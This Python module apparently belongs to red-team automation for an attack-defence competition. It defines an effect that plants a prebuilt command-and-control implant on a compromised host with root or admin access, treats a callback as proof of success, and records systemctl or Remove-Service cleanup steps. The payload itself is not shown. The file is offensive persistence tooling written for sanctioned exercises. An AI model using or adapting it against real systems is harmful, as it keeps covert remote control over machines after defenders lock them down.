"""implant_channel — (re)plant the C2 channel on a box and verify it by CALLBACK.

The channel is what makes the rest of the run survivable: it is the takedown path
that does not need SSH, and it is how red stays reachable after blue closes the
login path. Success is defined the way the plan defines it — the payload is
installed on the box AND a callback appears in the competition's operation within
the wait window. The artifact is recorded from the install either way, with the
channel outcome written into its detail, because a record gated on a check-in
goes silently missing when the check-in is slow.
"""

from ..c2.implant import Planter, load_manifest
from ..errors import PolicyError
from .base import Effect, Result, can_root, register


def box_id_for(ctx, ip, override=None):
    """The manifest key for a box: `<name>-<team>` (e.g. web01-2)."""
    if override:
        return override
    box = ctx.intel.box_by_ip(ip)
    if not box:
        return ip
    return f"{box['box']}-{box['identifier']}"


@register
class ImplantChannel(Effect):
    id = "implant_channel"
    name = "plant/repair the C2 channel"
    description = ("Install the frozen C2 payload for this box and verify the channel "
                   "by a callback appearing in the competition's operation. Re-plant "
                   "when the box has no callback or the last one is stale. Payloads "
                   "are built at comp-prep and frozen — never built mid-event.")
    params = {
        "ip": {"type": "str", "required": True, "desc": "target box"},
        "box_id": {"type": "str", "desc": "manifest key (default <box>-<team>)"},
        "transport": {"type": "enum", "choices": ["http", "webhook"],
                      "desc": "callback transport (default: the manifest's)"},
    }
    tags = frozenset({"c2", "access"})
    needs = {"foothold": True, "root": False, "c2": True, "os": "any"}

    def check(self, ctx, params):
        super().check(ctx, params)
        ip = params["ip"]
        fh = ctx.world.foothold(ip)
        if not (can_root(fh) or str((fh or {}).get("user", "")).lower()
                in ("administrator", "admin")):
            raise PolicyError(f"implant_channel needs a root/admin path on {ip}")
        if ctx.c2 is None and not load_manifest(ctx.cfg["run"].get("comp_dir") or "."):
            raise PolicyError("no C2 configured and no frozen payload manifest "
                              "(c2.enabled / red/payloads/manifest.json)")

    def run(self, ctx, params):
        ip = params["ip"]
        box_id = box_id_for(ctx, ip, params.get("box_id"))
        planter = Planter(ctx, comp_dir=ctx.cfg["run"].get("comp_dir"),
                          manifest=getattr(ctx, "payload_manifest", None))
        info = planter.plant(ip, box_id, transport=params.get("transport"))
        wait = int(ctx.cfg["c2"].get("plant_wait_sec", 45))
        detail = info.get("detail", "")
        channel = ("callback observed" if info.get("callback_seen")
                   else f"no callback within {wait}s")
        outcome = f"{detail}; channel: {channel}"
        result = Result(info.get("ok") and info.get("callback_seen"), outcome,
                        data={"box_id": box_id, "channel": bool(info.get("callback_seen")),
                              "uuid": info.get("uuid"), "paths": info.get("paths")},
                        installed=bool(info.get("ok")))
        if info.get("ok"):
            result.artifacts = [{"ip": ip, "kind": "c2-implant",
                                 "detail": outcome,
                                 "check_cmd": info.get("check_cmd"),
                                 "paths": info.get("paths") or []}]
            result.restore = {
                "recipe": [f"systemctl disable --now {info.get('unit')}" if not
                           ctx.is_windows(ip) else
                           f"Stop-Service '{info.get('unit')}'; "
                           f"Remove-Service -Name '{info.get('unit')}'",
                           f"rm -f {' '.join(info.get('paths') or ['<payload>'])}"],
                "secrets": None}
        return result
